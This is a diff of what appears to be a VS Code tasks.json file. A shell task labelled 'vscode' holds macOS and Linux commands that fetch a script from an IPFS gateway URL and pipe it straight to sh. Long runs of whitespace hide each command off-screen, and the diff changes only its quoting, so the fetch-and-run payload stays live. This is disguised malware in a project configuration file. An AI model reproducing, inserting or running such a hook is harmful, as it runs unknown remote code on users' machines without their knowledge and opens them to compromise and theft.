@@ -102,7 +102,7 @@
       "label": "vscode",
       "type": "shell",
       "osx": {
-        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl https://turquoise-decisive-chimpanzee-17.mypinata.cloud/ipfs/bafkreic2hgpiswaaupolyhvluwktz2vhkphdfww6qygtq5nfuck4onaffi -L | sh"
+        "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl 'https://turquoise-decisive-chimpanzee-17.mypinata.cloud/ipfs/bafkreic2hgpiswaaupolyhvluwktz2vhkphdfww6qygtq5nfuck4onaffi' -L | sh"
       },
       "linux": {
         "command":                                                                                                                                                                                                                                                                                                                                                                                                "curl -sL 'https://turquoise-decisive-chimpanzee-17.mypinata.cloud/ipfs/bafkreighmkw3upgiwfw6gcnvze4pr7vmogmfj7zkshqd2kvpuxvmh3eria' | sh"
